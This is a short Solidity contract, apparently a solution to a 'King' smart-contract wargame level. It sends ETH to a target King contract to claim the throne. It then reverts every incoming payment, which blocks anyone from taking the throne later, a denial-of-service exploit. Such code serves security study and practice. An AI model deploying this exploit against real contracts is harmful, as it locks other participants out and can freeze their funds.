// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address public target;

    constructor(address _target) payable {
        target = _target;

        // Become king by sending ETH to the King contract
        (bool ok,) = _target.call{value: msg.value}("");
        require(ok, "Failed to become king");
    }

    // Reject any ETH sent to this contract
    receive() external payable {
        revert("KingAttack refuses ETH");
    }
}
